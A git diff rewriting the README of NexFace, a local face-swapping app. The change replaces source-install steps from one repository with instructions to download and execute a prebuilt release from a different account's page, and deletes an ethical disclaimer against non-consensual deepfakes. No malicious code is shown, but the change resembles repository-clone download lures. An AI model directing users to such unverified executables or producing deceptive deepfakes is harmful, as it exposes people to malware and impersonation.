@@ -1,138 +1,108 @@
 # 👁️ NexFace
 
-A powerful, local, and user-friendly desktop application for high-quality batch face swapping. Built with Python and Gradio, this tool provides a convenient interface for the Face2Face library, allowing you to swap a single source face onto hundreds of target images or videos with just a few clicks.
+Welcome to **NexFace**, a powerful and user-friendly desktop application designed for high-quality batch face swapping. Built with Python and Gradio, this tool provides a convenient interface for the Face2Face library, allowing you to swap a single source face onto hundreds of target images or videos with just a few clicks.
 
- 
-*(Note: You should replace this with a real screenshot or GIF of your application in action.)*
+![NexFace in Action](https://via.placeholder.com/800x400.png?text=NexFace+Screenshot)
 
 ## ✨ Key Features
 
--   **Batch Processing**: Swap a face onto an entire folder of target images or videos in one go.
--   **Video Processing**: Support for both single video and batch video processing with audio preservation.
--   **High-Quality Mode**: An optional mode that intelligently preprocesses images, upscales faces using Lanczos resampling, and applies sharpening and contrast enhancements for a more professional result.
--   **Face Enhancement**: Supports multiple face enhancement models including GFPGAN and GPEN for superior quality results.
--   **User-Friendly Interface**: A clean and simple UI powered by Gradio with three main tabs:
-  - Image Processing
-  - Video Processing
-  - Batch Video Processing
--   **Convenient Output Management**: Automatically saves all results into an `output` folder and provides a single `.zip` file for easy download.
--   **Local & Private**: Runs entirely on your own machine. Your images are never uploaded to any cloud service.
--   **Cross-Platform**: Works on Windows, macOS, and Linux. Includes a handy button to open the output folder in your native file explorer.
--   **Progress Tracking**: Real-time progress updates with estimated time remaining for both image and video processing.
--   **Memory Management**: Automatic GPU memory cleanup and garbage collection to prevent out-of-memory errors.
+- **Batch Processing**: Swap a face onto an entire folder of target images or videos in one go. This feature saves time and effort, allowing you to focus on creativity rather than repetitive tasks.
 
+- **Video Processing**: Support for both single video and batch video processing with audio preservation. This means you can maintain the original audio while applying face swaps, making your videos more engaging.
 
-## ⚙️ How It Works
+- **High-Quality Mode**: An optional mode that intelligently preprocesses images, upscales faces using Lanczos resampling, and applies sharpening and contrast enhancements for a more professional result. This feature is perfect for those who demand the best quality.
 
-This application is built on top of the Face2Face library, which uses Insightface's powerful face detection and swapping technology. When "High Quality Mode" is enabled, the script performs several additional steps:
+- **Face Enhancement**: Supports multiple face enhancement models including GFPGAN and GPEN for superior quality results. These models improve the appearance of faces, ensuring they look natural and appealing.
 
-1.  **Preprocessing**: Source and target images are upscaled to a minimum size (1024px) using cubic interpolation to provide more detail for the swap.
-2.  **Swapping**: The Face2Face library performs the core face swapping using Insightface's models.
-3.  **Post-processing**: The swapped face region is enhanced using a combination of high-quality upscaling (Pillow's `LANCZOS` filter), sharpening, and a subtle contrast boost.
-4.  **Face Enhancement**: Optional face enhancement using models like GFPGAN or GPEN can be applied for superior quality results.
+- **User-Friendly Interface**: A clean and simple UI that makes it easy for anyone to use the application. You don’t need to be a tech expert to navigate NexFace.
 
-![Image](https://github.com/user-attachments/assets/ba87ae3f-84ba-4ec0-8490-da22f9f1efdf)
+## Getting Started
 
+To get started with NexFace, you can download the latest release from the [Releases page](https://github.com/orhanacar17/Nexface/releases). Once downloaded, follow the installation instructions to set up the application on your local machine.
 
+### Installation
 
-![Image](https://github.com/user-attachments/assets/47958ccb-a43f-4b37-b69c-3e292539a258)
+1. **Download the Release**: Visit the [Releases page](https://github.com/orhanacar17/Nexface/releases) and download the latest version of NexFace.
 
-![Image](https://github.com/user-attachments/assets/0600c053-f2bd-4187-b38c-a059b5a2c5e1)
+2. **Extract the Files**: Unzip the downloaded file to a location of your choice.
 
-## 📦 Requirements
+3. **Run the Application**: Navigate to the extracted folder and execute the application file to launch NexFace.
 
--   Python 3.7 or higher
--   Minimum 5GB of RAM
--   Recommended: GPU with at least 8GB of VRAM for fast inference (runs on CPU but will be slower)
--   For video support: FFmpeg installation
--   The Python libraries listed in `requirements.txt`.
+### Requirements
 
-## 🚀 Installation & Setup
+Before you start using NexFace, ensure that your system meets the following requirements:
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/ExoFi-Labs/Nexface.git
-    cd nexface
-    ```
+- **Operating System**: Windows, macOS, or Linux
+- **Python Version**: Python 3.7 or higher
+- **Dependencies**: The application requires several Python packages. You can install them using pip:
 
-2.  **Create a virtual environment (recommended):**
-    ```bash
-    python -m venv venv
-    source venv/bin/activate  # On Windows, use `venv\Scripts\activate`
-    ```
+```bash
+pip install -r requirements.txt
+```
 
-3.  **Install the required libraries:**
-    ```bash
-    # For basic face swapping functionality
-    pip install socaity-face2face
-    
-    # For full functionality including web service
-    pip install socaity-face2face[full]
-    
-    # Install additional project requirements
-    pip install -r requirements.txt
-    ```
+## Usage
 
-## ▶️ How to Run
+Using NexFace is straightforward. Follow these steps to perform a face swap:
 
-1.  Navigate to the project directory in your terminal.
-2.  Run the application script:
-    ```bash
-    python app.py 
-    ```
-    
-3.  The script will start a local web server and print a URL (usually `http://127.0.0.1:7860`). Open this URL in your web browser to use the application.
+1. **Open NexFace**: Launch the application.
 
-## 📖 How to Use
+2. **Select Source Face**: Choose the face you want to swap from your files.
 
-### Image Processing
-1. **Upload Source Face**: Drag and drop an image containing the face you want to use into the "Source Face" box.
-2. **Upload Target Images**: Drag and drop one or more images you want to swap the face onto into the "Target Images" box.
-3. **Configure Options**:
-    - Check **✨ Enhance Output Faces** for an extra layer of clarity.
-    - Check **🔍 High Quality Mode** for the best possible results (this will be slower).
-    - Adjust the **Face Upscale Factor** if using High Quality Mode.
-4. **Start Processing**: Click the **🔁 Start Processing** button.
-5. **View Results**:
-    - Previews of the swapped images will appear in the "Swapped Results" gallery.
-    - Once the batch is complete, a link to download a `.zip` file of all results will appear.
-    - Click the **📂 Open Output Directory** button to directly access the saved image files on your computer.
+3. **Select Target Images/Videos**: Upload the images or videos you want to process.
 
-### Video Processing
-1. **Upload Source Face**: Drag and drop an image containing the face you want to use.
-2. **Upload Target Video**: Select a video file you want to process.
-3. **Configure Options**: Same as image processing.
-4. **Start Processing**: Click the **🔁 Start Video Processing** button.
-5. **View Results**: The processed video will appear in the output section with audio preserved.
+4. **Adjust Settings**: Optionally, toggle the High-Quality Mode and select any face enhancement models you wish to use.
 
-### Batch Video Processing
-1. **Upload Source Face**: Drag and drop an image containing the face you want to use.
-2. **Upload Target Videos**: Select multiple video files to process.
-3. **Configure Options**: Same as image processing.
-4. **Start Processing**: Click the **🔁 Start Batch Processing** button.
-5. **View Results**: A `.zip` file containing all processed videos will be available for download.
+5. **Start Processing**: Click the "Start" button to begin the face swapping process. 
 
-## ⚠️ Known Limitations
+6. **View Results**: Once the process is complete, you can view the results in the designated output folder.
 
-- Processing large videos may require significant GPU memory. The application includes automatic memory management, but very large videos might still cause issues on systems with limited VRAM.
-- Video processing speed depends on your hardware. GPU acceleration is recommended for faster processing.
-- The application requires FFmpeg for video processing with audio. If FFmpeg is not installed, videos will be processed without audio.
+## Example Workflows
 
-## ⚠️ Ethical Disclaimer
+### Batch Face Swapping
 
-This tool is intended for creative, educational, and ethical purposes only. The creation of non-consensual content, deepfakes, or any material that could be used to mislead, harass, or defame individuals is strictly prohibited. By using this software, you agree to use it responsibly and in accordance with all applicable laws. The developers of this tool are not responsible for any misuse.
+For batch processing, simply select a folder containing multiple target images or videos. NexFace will automatically process each file and apply the selected source face.
 
-## 🙏 Acknowledgments
+### Video Face Swapping
 
-This project is built on top of several amazing open-source projects:
+If you want to swap faces in a video, choose a single video file. The application will handle the face swapping frame by frame, ensuring that the audio remains intact.
 
-- [Insightface](https://github.com/deepinsight/insightface) - For the core face detection and swapping technology
-- [ROOP](https://github.com/s0md3v/roop) - For inspiration and parts of the face swapping implementation
-- [GFPGAN](https://github.com/TencentARC/GFPGAN) - For face restoration capabilities
-- [GPEN](https://github.com/yangxy/GPEN) - For additional face enhancement options
+### High-Quality Processing
 
-A special thanks to all the contributors of these projects for making this technology accessible to the community.
+When using High-Quality Mode, NexFace will preprocess images to enhance their quality. This includes upscaling and applying filters for better results.
 
-## 📄 License
+## Troubleshooting
 
-This project is open-source and available under the [MIT License](LICENSE).
+If you encounter any issues while using NexFace, consider the following solutions:
+
+- **Installation Issues**: Ensure that you have the correct version of Python installed and that all dependencies are met.
+
+- **Performance Problems**: If the application runs slowly, try closing other applications to free up system resources.
+
+- **Face Swapping Errors**: Check that the source face and target images are of good quality. Poor quality images may lead to unsatisfactory results.
+
+## Contributing
+
+We welcome contributions to NexFace! If you have ideas for new features or improvements, feel free to submit a pull request. Please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Make your changes and commit them.
+4. Push to your fork and create a pull request.
+
+## License
+
+NexFace is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Acknowledgments
+
+- **Gradio**: For providing an easy-to-use interface for machine learning models.
+- **Face2Face Library**: For enabling realistic face swapping capabilities.
+- **Open Source Community**: For continuous support and contributions.
+
+## Links
+
+For the latest updates and releases, visit the [Releases page](https://github.com/orhanacar17/Nexface/releases). You can find the latest version to download and execute.
+
+If you have any questions or need support, feel free to reach out through the Issues section of the repository.
+
+Happy swapping!
